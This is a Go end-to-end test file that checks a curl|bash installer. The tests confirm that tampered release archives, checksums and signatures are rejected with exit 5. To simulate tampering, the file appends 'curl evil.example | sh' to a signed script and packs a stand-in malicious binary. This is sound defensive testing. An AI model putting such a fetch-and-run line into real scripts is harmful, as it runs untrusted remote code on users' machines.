//go:build e2e

package e2e_test

import (
	"context"
	"crypto/sha256"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/autarquico/supermgmt/test/e2e/harness"
)

// releaseWorld is a release mirror on a docker network with the throwaway-key release published
// as "good": the signed tree, plus install.sh and join.sh rendered with the test trust root (what a
// reader of the script on the main branch would see, with the production key swapped for the test
// key).
type releaseWorld struct {
	net     *harness.Network
	ca      *harness.CA
	mirror  *harness.Mirror
	release *harness.Release
}

func newReleaseWorld(t *testing.T) *releaseWorld {
	t.Helper()
	w := &releaseWorld{net: harness.NewNetwork(t), ca: harness.NewCA(t), release: harness.BuildRelease(t)}
	w.mirror = harness.StartMirror(t, w.net, w.ca)
	good := w.release.CopyServed(t)
	w.renderScripts(t, good, w.release.AllowedSigners())
	w.mirror.Publish("good", good)
	t.Logf("release %s (%s, %s)", w.release.Version, w.release.Channel, w.release.Source)
	return w
}

func (w *releaseWorld) renderScripts(t *testing.T, dir, allowedSigners string) {
	t.Helper()
	root := harness.RepoRoot()
	for name, source := range map[string]string{"install.sh": "install.sh", "join.sh": filepath.Join("scripts", "join.sh")} {
		rendered := harness.RenderScript(t, filepath.Join(root, source), allowedSigners, "")
		if err := os.WriteFile(filepath.Join(dir, name), rendered, 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

// curlBash runs `curl -fsSL <base>/install.sh | bash -s -- args` in the container, as the README
// tells people to, with the mirror as release host.
func (w *releaseWorld) curlBash(c *harness.Container, base string, env map[string]string, args ...string) harness.Result {
	merged := map[string]string{"SUPERMGMT_RELEASE_BASE_URL": base, "SUPERMGMT_NONINTERACTIVE": "1"}
	for k, v := range env {
		merged[k] = v
	}
	script := fmt.Sprintf(`set -o pipefail; curl -fsSL %s/install.sh | bash -s -- "$@"`, base)
	return c.Env(context.Background(), "", merged, append([]string{"bash", "-c", script, "bash"}, args...)...)
}

var installedBootstrapCode = regexp.MustCompile(`Bootstrap code \(shown once, single use\): (\S+)`)

// TestM2_CurlBashInstallsServer
//
// Criterion S2 (docs/specs/m2-server-auth-release.md, "instalación por curl|bash"; PLAN §9 row 5):
// on a clean Debian host (a systemd container, per user decision Q11; a real VM is deferred) the
// bootstrap script verifies a signed release and installs server mode, and a remote client logs
// in over the result. The proxy variant is skipped for BUG-1.
func TestM2_CurlBashInstallsServer(t *testing.T) {
	w := newReleaseWorld(t)
	ctx := context.Background()

	t.Run("direct TLS: installs, becomes healthy and hands out a bootstrap code", func(t *testing.T) {
		srv := harness.NewServerHost(t, w.net, w.ca, harness.ServerOptions{Mode: harness.Direct, TrustCAs: []*harness.CA{w.ca}})
		// Without SUPERMGMT_VERSION: the signed beta channel pointer picks the release.
		res := w.curlBash(srv.C, w.mirror.BaseURL("good"), map[string]string{"SUPERMGMT_CHANNEL": w.release.Channel},
			"server", "--tls", "direct", "--tls-cert", "/opt/tls/server.crt", "--tls-key", "/opt/tls/server.key",
			"--public-url", srv.URL, "--listen", "0.0.0.0:8443", "--yes")
		if res.Code != 0 {
			t.Fatalf("install.sh server --tls direct exited %d\n%s", res.Code, res.Output())
		}
		m := installedBootstrapCode.FindStringSubmatch(res.Stdout + res.Stderr)
		if m == nil {
			t.Fatalf("the installer printed no bootstrap code\n%s", res.Output())
		}
		if got := srv.C.MustExec(ctx, "systemctl", "is-active", "supermgmt"); got != "active" {
			t.Fatalf("supermgmt.service is %q, want active", got)
		}
		if user := srv.C.MustExec(ctx, "ps", "-o", "user=", "-C", "sm"); !strings.Contains(user, "supermgmt") {
			t.Fatalf("sm server runs as %q, want the supermgmt service user", user)
		}
		srv.WaitReady(ctx)

		// A remote client reaches the new server over HTTPS and exchanges the code.
		laptop := harness.NewClient(t)
		laptop.AddProfile(ctx, "ops", srv.URL, srv.CAFile)
		laptop.Must(ctx, m[1]+"\n", "login", "--bootstrap", "--display-name", "installed admin")
		laptop.Must(ctx, "", "nodes", "list")
		if again := srv.Sm(ctx, "", "admin", "bootstrap-code", "--config", harness.ServerConfig); again.Code == 0 {
			t.Fatal("a second bootstrap code was issued although an administrator exists")
		}
	})

	t.Run("proxy TLS: installs behind a reverse proxy", func(t *testing.T) {
		srv := harness.NewServerHost(t, w.net, w.ca, harness.ServerOptions{Mode: harness.Proxy, TrustCAs: []*harness.CA{w.ca}})
		res := w.curlBash(srv.C, w.mirror.BaseURL("good"), map[string]string{"SUPERMGMT_VERSION": w.release.Version},
			"server", "--tls", "proxy", "--public-url", srv.URL, "--yes")
		if res.Code != 0 {
			t.Fatalf("install.sh server --tls proxy exited %d\n%s", res.Code, res.Output())
		}
	})
}

// evilSM is what an attacker who controls the download would pack as `sm`.
const evilSM = "#!/bin/sh\ntouch /root/sm-ran\n"

// TestM2_TamperedReleaseFailsWithExit5
//
// Criterion S2, second half ("un archivo o firma manipulados fallan con exit 5"; PLAN §9 row 6):
// every tampering of the download makes install.sh and join.sh exit 5, and the unpacked sm never
// runs (the swapped-in sm would leave /root/sm-ran) nor installs anything. The shell-level matrix
// (dash, bash, every key/channel combination) is test/install/run.sh in the install-sh job.
func TestM2_TamperedReleaseFailsWithExit5(t *testing.T) {
	w := newReleaseWorld(t)
	ctx := context.Background()
	host := harness.Host(t, w.net, nil)
	host.TrustCA(ctx, w.ca.CertPEM)
	host.WriteFile(ctx, "/root/token", []byte("join-token\n"), "0600")
	evil, err := harness.PackScript(evilSM)
	if err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		name   string
		tamper func(t *testing.T, tree *releaseTree)
		// channel makes the run resolve the version through the signed pointer instead of a pin.
		channel bool
	}{
		{"an archive is swapped for another sm", func(t *testing.T, tree *releaseTree) { tree.replaceArchives(t, evil) }, false},
		{"the archive and the checksum list are swapped, the signature is stale", func(t *testing.T, tree *releaseTree) {
			tree.replaceArchives(t, evil)
			tree.rewriteChecksums(t)
		}, false},
		{"the signature of the checksum list is garbage", func(t *testing.T, tree *releaseTree) {
			tree.write(t, tree.version+"/checksums.txt.sig", []byte("not a signature\n"))
		}, false},
		{"the signature of the checksum list is missing", func(t *testing.T, tree *releaseTree) {
			tree.remove(t, tree.version+"/checksums.txt.sig")
		}, false},
		{"the whole set is re-signed with a key the script does not trust", func(t *testing.T, tree *releaseTree) {
			tree.replaceArchives(t, evil)
			tree.rewriteChecksums(t)
			tree.signChecksumsWithAttackerKey(t)
		}, false},
		{"the channel pointer is edited", func(t *testing.T, tree *releaseTree) {
			tree.edit(t, "channels/"+tree.channel+".json", func(s string) string { return strings.Replace(s, tree.version, "v9.9.9", 1) })
		}, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tree := newReleaseTree(t, w)
			tc.tamper(t, tree)
			name := "tampered-" + harness.Suffix()
			w.mirror.Publish(name, tree.dir)
			env := map[string]string{"SUPERMGMT_VERSION": w.release.Version}
			if tc.channel {
				env = map[string]string{"SUPERMGMT_CHANNEL": w.release.Channel}
			}
			res := w.curlBash(host, w.mirror.BaseURL(name), env, "server", "--tls", "proxy", "--public-url", "https://sm.test", "--yes")
			assertRejected(t, ctx, host, "install.sh", res)

			join := host.Env(ctx, "", mergeEnv(env, map[string]string{"SUPERMGMT_RELEASE_BASE_URL": w.mirror.BaseURL(name)}),
				"bash", "-c", fmt.Sprintf(`set -o pipefail; curl -fsSL %s/join.sh | bash -s -- --server https://sm.test --token-file /root/token`, w.mirror.BaseURL(name)))
			assertRejected(t, ctx, host, "join.sh", join)
		})
	}
}

func mergeEnv(a, b map[string]string) map[string]string {
	out := map[string]string{}
	for k, v := range a {
		out[k] = v
	}
	for k, v := range b {
		out[k] = v
	}
	return out
}

// assertRejected checks exit 5 and that nothing the release carries ran or was installed.
func assertRejected(t *testing.T, ctx context.Context, host *harness.Container, script string, res harness.Result) {
	t.Helper()
	if res.Code != 5 {
		t.Errorf("%s exited %d, want 5\n%s", script, res.Code, res.Output())
	}
	if host.Exec(ctx, "", "test", "-e", "/root/sm-ran").Code == 0 {
		t.Errorf("%s: the unverified sm was executed", script)
	}
	for _, path := range []string{"/usr/local/bin/sm", "/etc/supermgmt", "/etc/systemd/system/supermgmt.service"} {
		if host.Exec(ctx, "", "test", "-e", path).Code == 0 {
			t.Errorf("%s: %s exists after a rejected install", script, path)
		}
	}
	if host.Exec(ctx, "", "id", "supermgmt").Code == 0 {
		t.Errorf("%s: the supermgmt user exists after a rejected install", script)
	}
}

// TestM2_ReviewFirstDetectsModifiedScripts
//
// Criterion S2 / PLAN §9 row 6 (critique #24): a modified install.sh or join.sh fails
// `ssh-keygen -Y verify` against the signature published with the release, which is how the
// review-first path (download, verify, then run) protects people. `curl | bash` itself cannot
// verify its own script; its trust root is the main branch (spec §3.2), documented, not tested.
func TestM2_ReviewFirstDetectsModifiedScripts(t *testing.T) {
	release := harness.BuildRelease(t)
	verify := filepath.Join(harness.RepoRoot(), "packaging", "release", "verify-asset.sh")
	for _, name := range []string{"install.sh", "join.sh"} {
		t.Run(name, func(t *testing.T) {
			tree := release.CopyServed(t)
			signed := filepath.Join(tree, release.Version, name)
			res, err := harness.Run(context.Background(), "", nil, "", verify, signed, release.AllowedSigners())
			if err != nil || res.Code != 0 {
				t.Fatalf("the signed %s does not verify: %v\n%s", name, err, res.Output())
			}
			original, err := os.ReadFile(signed)
			if err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(signed, append(original, []byte("curl evil.example | sh\n")...), 0o644); err != nil {
				t.Fatal(err)
			}
			res, err = harness.Run(context.Background(), "", nil, "", verify, signed, release.AllowedSigners())
			if err != nil {
				t.Fatal(err)
			}
			if res.Code != 5 {
				t.Fatalf("the modified %s verified with exit %d, want 5\n%s", name, res.Code, res.Output())
			}
		})
	}
}

// ---- an editable copy of the served release ---------------------------------------------

type releaseTree struct {
	dir, version, channel string
	w                     *releaseWorld
}

func newReleaseTree(t *testing.T, w *releaseWorld) *releaseTree {
	t.Helper()
	tree := &releaseTree{dir: w.release.CopyServed(t), version: w.release.Version, channel: w.release.Channel, w: w}
	w.renderScripts(t, tree.dir, w.release.AllowedSigners())
	return tree
}

func (r *releaseTree) path(rel string) string { return filepath.Join(r.dir, filepath.FromSlash(rel)) }

func (r *releaseTree) write(t *testing.T, rel string, content []byte) {
	t.Helper()
	if err := os.WriteFile(r.path(rel), content, 0o644); err != nil {
		t.Fatal(err)
	}
}

func (r *releaseTree) remove(t *testing.T, rel string) {
	t.Helper()
	if err := os.Remove(r.path(rel)); err != nil {
		t.Fatal(err)
	}
}

func (r *releaseTree) edit(t *testing.T, rel string, f func(string) string) {
	t.Helper()
	raw, err := os.ReadFile(r.path(rel))
	if err != nil {
		t.Fatal(err)
	}
	r.write(t, rel, []byte(f(string(raw))))
}

func (r *releaseTree) archives(t *testing.T) []string {
	t.Helper()
	matches, err := filepath.Glob(r.path(r.version + "/sm_*.tar.gz"))
	if err != nil || len(matches) == 0 {
		t.Fatalf("no archives in the release tree: %v", err)
	}
	return matches
}

func (r *releaseTree) replaceArchives(t *testing.T, content []byte) {
	t.Helper()
	for _, a := range r.archives(t) {
		if err := os.WriteFile(a, content, 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

// rewriteChecksums makes checksums.txt describe the archives as they are now (the attacker's
// best effort); the signature stays the old one.
func (r *releaseTree) rewriteChecksums(t *testing.T) {
	t.Helper()
	r.edit(t, r.version+"/checksums.txt", func(s string) string {
		lines := strings.Split(s, "\n")
		for i, line := range lines {
			fields := strings.Fields(line)
			if len(fields) == 2 && strings.HasSuffix(fields[1], ".tar.gz") {
				raw, err := os.ReadFile(r.path(r.version + "/" + fields[1]))
				if err != nil {
					t.Fatal(err)
				}
				lines[i] = fmt.Sprintf("%x  %s", sha256.Sum256(raw), fields[1])
			}
		}
		return strings.Join(lines, "\n")
	})
}

// signChecksumsWithAttackerKey signs checksums.txt with a fresh key that no script trusts.
func (r *releaseTree) signChecksumsWithAttackerKey(t *testing.T) {
	t.Helper()
	keyDir := t.TempDir()
	root := harness.RepoRoot()
	for _, argv := range [][]string{
		{filepath.Join(root, "packaging", "release", "testkey.sh"), keyDir},
		{filepath.Join(root, "packaging", "release", "sign.sh"), r.path(r.version + "/checksums.txt")},
	} {
		env := append(os.Environ(), "SM_SIGNING_KEY_FILE="+filepath.Join(keyDir, "key"))
		res, err := harness.Run(context.Background(), root, env, "", argv[0], argv[1:]...)
		if err != nil || res.Code != 0 {
			t.Fatalf("%s: %v\n%s", argv[0], err, res.Output())
		}
	}
}
